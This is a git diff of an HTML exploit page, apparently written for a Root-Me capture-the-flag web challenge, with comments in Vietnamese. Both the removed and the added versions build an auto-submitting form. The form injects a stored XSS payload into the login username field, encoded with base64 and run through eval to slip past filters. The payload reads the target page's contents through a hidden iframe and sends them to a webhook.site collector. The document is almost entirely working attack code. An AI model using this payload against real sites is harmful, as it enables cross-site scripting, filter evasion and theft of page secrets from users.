@@ -1,17 +1,59 @@
-<script>
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = 'http://challenge01.root-me.org:58003/login';
-    form.target = '_self'; 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit DOM Secrets</title>
+</head>
+<body>
+    <script>
+        // --- CẤU HÌNH ---
+        const WEBHOOK_URL = 'https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce';
+        const CHALLENGE_URL = 'http://challenge01.root-me.org:58003/login';
 
-    const input = document.createElement('input');
-    input.name = 'username';
-    
-    // Payload tối giản, sử dụng dấu phẩy thay vì dấu chấm phẩy và không dùng ngoặc nhọn nếu có thể
-    // Ở đây ta dùng try/catch trên 1 dòng duy nhất.
-    input.value = `<script>try{fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?d='+btoa(window.opener.document.body.innerText))}catch(e){fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?e='+btoa(e.message))}<\/script>`;
+        /**
+         * CHUẨN BỊ PAYLOAD XSS:
+         * Script này sẽ chạy trên domain challenge.
+         * Nó tạo 1 iframe ẩn trỏ về trang chủ (nơi có secret), 
+         * đợi load xong rồi gửi toàn bộ nội dung về Webhook.
+         */
+        const xssCode = `
+            var i = document.createElement('iframe');
+            i.src = '/'; 
+            i.style.display = 'none';
+            i.onload = function() {
+                try {
+                    var secret = i.contentDocument.documentElement.innerText;
+                    fetch('${WEBHOOK_URL}?flag=' + btoa(secret));
+                } catch(e) {
+                    fetch('${WEBHOOK_URL}?error=' + btoa(e.message));
+                }
+            };
+            document.body.appendChild(i);
+        `;
 
-    form.appendChild(input);
-    document.body.appendChild(form);
-    form.submit();
-</script>
+        // Mã hóa Base64 để tránh lỗi SyntaxError: missing } khi server render username
+        const encodedXSS = btoa(xssCode.trim());
+
+        /**
+         * THỰC THI:
+         * Tự động gửi một POST request đến trang login của challenge
+         * với username chứa payload đã mã hóa.
+         */
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = CHALLENGE_URL;
+
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'username';
+        
+        // Sử dụng eval(atob()) để thực thi chuỗi mã hóa, né sạch các bộ lọc ký tự đặc biệt
+        input.value = `<script>eval(atob('${encodedXSS}'))<\/script>`;
+
+        form.appendChild(input);
+        document.body.appendChild(form);
+
+        // Kích hoạt tấn công
+        form.submit();
+    </script>
+</body>
+</html>
